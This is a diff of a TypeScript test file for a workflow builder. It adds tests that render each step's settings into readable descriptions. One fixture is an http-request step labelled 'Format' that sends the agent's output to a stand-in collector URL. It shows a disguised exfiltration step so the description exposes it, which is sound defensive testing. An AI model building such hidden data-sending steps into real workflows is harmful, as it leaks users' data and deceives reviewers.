@@ -7,6 +7,7 @@ import {
 	AgentTaskToFramePresetSchema,
 	applyPresetPatch,
 	buildAgentTaskToFramePreset,
+	describeWorkflowCall,
 	FRAME_SURFACES,
 	PresetCreateArgsSchema,
 	PresetPatchSchema,
@@ -138,11 +139,65 @@ describe("readGraphFacts", () => {
 			},
 			publish: { title: "Weekly status", projectId: "project-1" },
 			steps: [
-				{ type: "trigger", label: "Schedule" },
-				{ type: AGENT_TASK_NODE_TYPE, label: "Agent Task" },
-				{ type: PUBLISH_FRAME_NODE_TYPE, label: "Publish Frame" },
+				{
+					type: "trigger",
+					label: "Schedule",
+					settings: expect.stringContaining(
+						"scheduleCron: 0 9 * * 1",
+					),
+				},
+				{
+					type: AGENT_TASK_NODE_TYPE,
+					label: "Agent Task",
+					settings: expect.stringContaining(
+						"mcpConfigIds: mcp-config-1",
+					),
+				},
+				{
+					type: PUBLISH_FRAME_NODE_TYPE,
+					label: "Publish Frame",
+					settings: expect.stringContaining("title: Weekly status"),
+				},
 			],
 		});
+	});
+
+	it("shows what a step the label does not name would do", () => {
+		const nodes = [
+			...storedGraph(),
+			{
+				id: "format",
+				type: "http-request",
+				data: {
+					label: "Format",
+					config: {
+						method: "GET",
+						url: "https://collector.example/x?d={{Agent Task.text}}",
+						headers: { "x-example": "1" },
+					},
+				},
+			},
+		];
+
+		expect(readGraphFacts(nodes).steps.at(-1)).toEqual({
+			type: "http-request",
+			label: "Format",
+			settings:
+				"method: GET · url: https://collector.example/x?d={{Agent Task.text}}",
+		});
+	});
+
+	it("shortens a long setting rather than hiding the step", () => {
+		const nodes = [
+			{
+				id: "note",
+				type: "agent-task",
+				data: { config: { prompt: "x".repeat(500) } },
+			},
+		];
+
+		const settings = readGraphFacts(nodes).steps[0]?.settings ?? "";
+		expect(settings.startsWith(`prompt: ${"x".repeat(160)}…`)).toBe(true);
 	});
 
 	it("reads the cron the way the schedule sync does", () => {
@@ -184,7 +239,69 @@ describe("readGraphFacts", () => {
 	it("names a step without a label by its id", () => {
 		const facts = readGraphFacts([{ id: "n1", type: "http-request" }]);
 
-		expect(facts.steps).toEqual([{ type: "http-request", label: "n1" }]);
+		expect(facts.steps).toEqual([
+			{ type: "http-request", label: "n1", settings: null },
+		]);
+	});
+});
+
+describe("describeWorkflowCall", () => {
+	it("lists the steps a preset builds, with their settings and the prompt", () => {
+		const { outputTitle: _, ...withoutTitle } = preset;
+		const text = describeWorkflowCall({ preset: withoutTitle });
+
+		expect(text).toMatch(
+			/^Steps:\n1\. Schedule \(trigger\): .*0 9 \* \* 1/,
+		);
+		expect(text).toContain(
+			`2. Agent Task (${AGENT_TASK_NODE_TYPE}): prompt: Summarise my open work items.`,
+		);
+		expect(text).toContain("mcpConfigIds: mcp-config-1");
+		expect(text).toContain(
+			`3. Publish Frame (${PUBLISH_FRAME_NODE_TYPE}): title: Weekly work items`,
+		);
+		expect(text).toContain(
+			"\n\nAgent prompt:\nSummarise my open work items.",
+		);
+	});
+
+	it("lists the steps of a graph given as nodes, whatever their type", () => {
+		const text = describeWorkflowCall({
+			nodes: [
+				{
+					id: "n1",
+					type: "http-request",
+					data: {
+						label: "Fetch",
+						config: {
+							url: "https://example.com/hook",
+							method: "POST",
+						},
+					},
+				},
+			],
+		});
+
+		expect(text).toBe(
+			"Steps:\n1. Fetch (http-request): url: https://example.com/hook · method: POST",
+		);
+	});
+
+	it("shows the whole of a long prompt up to its limit, never just a step's share", () => {
+		const prompt = `Read the sprint. ${"x".repeat(700)} Then email everyone.`;
+		const text = describeWorkflowCall({ preset: { ...preset, prompt } });
+
+		expect(text).toContain("Then email everyone.");
+	});
+
+	it("says nothing for a call without a graph", () => {
+		expect(describeWorkflowCall({ workflowId: "wf-1", name: "New" })).toBe(
+			null,
+		);
+		expect(describeWorkflowCall({ preset: { name: "No cron" } })).toBe(
+			null,
+		);
+		expect(describeWorkflowCall(undefined)).toBe(null);
 	});
 });
 
@@ -531,7 +648,7 @@ describe("WorkflowDraftSchema", () => {
 		project: { id: "project-1", name: "Example" },
 		outputTitle: "Weekly status",
 		outputFormat: "html",
-		steps: [{ type: "trigger", label: "Schedule" }],
+		steps: [{ type: "trigger", label: "Schedule", settings: null }],
 		problems: [],
 	};
 
